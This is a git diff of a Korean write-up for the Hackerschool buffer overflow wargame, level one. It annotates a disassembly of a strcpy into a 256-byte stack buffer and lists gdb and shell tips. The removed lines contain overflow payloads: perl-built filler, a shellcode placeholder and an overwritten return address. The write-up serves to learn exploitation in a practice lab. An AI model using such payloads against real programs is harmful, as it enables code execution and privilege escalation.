@@ -1,7 +1,6 @@
  
 
 # Lord Of the Buffer Overflow 문제풀이
-***- akagaeng***
 
 Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제작한 워게임에 대한 풀이를 보고서 형식으로 작성하였습니다.
 원래는 c로 작성된 소스코드를 볼 수 있도록 출제측에서 오픈해놓았으나, 학습이 목적이기도하며 실제 상황에서는 소스코드가 오픈되어 있지 않는 점 등을 감안하여 GDB디버거로 바이너리 코드를 열어 이를 통해 분석하는 리버스엔지니어링을 이용한 문제해결을 하였습니다.
@@ -10,45 +9,29 @@ Buffer Overflow기법에 대해서 공부하는 용도로 hackerschool에서 제
 - [BOF 전용 게시판](http://www.hackerschool.org/HS_Boards/zboard.php?id=bof_fellowship)
 - [BOF 다운로드](http://www.hackerschool.org/HS_Boards/zboard.php?id=bof_fellowship_2round&page=1&sn1=&divpage=1&sn=off&ss=on&sc=on&select_arrange=headnum&desc=asc&no=4)
 
+### 사전 지식
+- gdb 접속: $ gdb
+- gdb 에서 esp 70개씩 보면 보기 편함
+- level clear 방법: `$bash` 나오면 성공
+- 다음레벨 id 확인 방법: `$bash: id` or `$bash: whoami` 입력
+- 다음레벨 pw 확인 방법: `$ my-pass`
+- putty로 telnet 접속 방법: `#> netconfig`
+- 유동ip설정: `#> /sbin/ifconfig`
+- 환경변수에서 SHELL 포함된 내용 보기: `#> env | grep SHELL`
+- SHELL 변경: `#> chsh` 입력 후 `/bin/bash2` 입력
 
 ### (01) LEVEL1: gate/gate
-패스워드 확인하는 명령어
-`$ my-pass`
 
-
-gdb 에서 esp 70개씩 보면 됨
-
-r $(perl -e 'print "a"x260 ."CCCC"')
-r $(perl -e 'print "a"x260 . "\x4c\xf9\xff\xbf"')
-
-셸코드 크기: 25바이트. "a"235만큼 채우면 됨
-
-r $(perl -e 'print "SHELLCODE" . "a"x235 . "\x48\xf9\xff\xbf"')
-
-SHELL CODE 시작될 주소: bf-ff-f9-48
-
-$bash: 나오면 성공
-
-$bash에서 id or whoami 입력하면 다음 레벨 id 나오고,
-$bash에서 my-pass 입력하면 비밀번호 나옴
-
-putty로 telnet 접속 방법
-`#> netconfig`
-
-유동ip설정
-`#> /sbin/ifconfig`
-
-putty에서 입력
-
-환경변수에서 SHELL 포함된 내용 보기
-`#> env | grep SHELL`
-
-SHELL 변경
-`#> chsh` 입력 후 `/bin/bash2` 입력
-
-
-  0x8048430  <main>:       push   %ebp   0x8048431  <main+1>:     mov    %ebp,%esp    0x8048433 <main+3>:     sub     %esp,0x100    0x8048439 <main+9>:     cmp     DWORD PTR [%ebp+8],1   0x804843d  <main+13>:    jg     0x8048456  <main+38>       0x804843f  <main+15>:    push   0x80484e0   0x8048444  <main+20>:    call   0x8048350  <printf>   0x8048449  <main+25>:    add    %esp,4       0x804844c  <main+28>:    push   0   0x804844e  <main+30>:    call   0x8048360  <exit>   0x8048453 <main+35>:     add    %esp,4    0x8048456 <main+38>:    mov     %eax,DWORD PTR [%ebp+12]   0x8048459  <main+41>:    add    %eax,4   0x804845c <main+44>:     mov    %edx,DWORD PTR [%eax]   0x804845e  <main+46>:    push   %edx   0x804845f <main+47>:     lea    %eax,[%ebp-256]   0x8048465  <main+53>:    push   %eax   0x8048466 <main+54>:     call   0x8048370 <strcpy>   0x804846b  <main+59>:    add    %esp,8    0x804846e <main+62>:    lea     %eax,[%ebp-256]   0x8048474  <main+68>:    push   %eax   0x8048475  <main+69>:    push   0x80484ec   0x804847a  <main+74>:    call   0x8048350  <printf>   0x804847f  <main+79>:    add    %esp,8    0x8048482 <main+82>:    leave   0x8048483  <main+83>:    ret	프롤로그                                                          스택영역  100바이트 할당     [ebp+8]은  첫번째 argument이므로 argc   if(argc <=1)        printf( "argv  error\n");   함수리턴     아래  함수의 argument   exit(0);   함수리턴     [ebp+12]는  두번째 argument이므로 *argv[0]   argv[1]     strcpy의  두번째 argument argv[1]     strcpy의  첫번재 argument &buffer[0]   strcpy(buffer,argv[1]);   함수리턴     &buffer[0]     "%s\n"   printf(""%s\n",buffer);   함수리턴     에필로그
-                                          	                                        
+```
+0x8048430 <main>:       push   %ebp 0x8048431 <main+1>:     mov    %ebp,%esp
+0x8048433 <main+3>:     sub    %esp,0x100
+0x8048439 <main+9>:     cmp    DWORD PTR [%ebp+8],1 0x804843d <main+13>:    jg     0x8048456 <main+38>
+0x804843f <main+15>:    push   0x80484e0 0x8048444 <main+20>:    call   0x8048350 <printf> 0x8048449 <main+25>:    add    %esp,4
+0x804844c <main+28>:    push   0 0x804844e <main+30>:    call   0x8048360 <exit> 0x8048453 <main+35>:    add    %esp,4
+0x8048456 <main+38>:    mov    %eax,DWORD PTR [%ebp+12] 0x8048459 <main+41>:    add    %eax,4 0x804845c <main+44>:    mov    %edx,DWORD PTR [%eax] 0x804845e <main+46>:    push   %edx 0x804845f <main+47>:    lea    %eax,[%ebp-256] 0x8048465 <main+53>:    push   %eax 0x8048466 <main+54>:    call   0x8048370 <strcpy> 0x804846b <main+59>:    add    %esp,8
+0x804846e <main+62>:    lea    %eax,[%ebp-256] 0x8048474 <main+68>:    push   %eax 0x8048475 <main+69>:    push   0x80484ec 0x804847a <main+74>:    call   0x8048350 <printf> 0x804847f <main+79>:    add    %esp,8
+0x8048482 <main+82>:    leave 0x8048483 <main+83>:    ret
+```
 
 \1. 제약조건은 arg가 2개 이상이기만 하면 되므로 사용할 수 있는 공간이 많음.
 
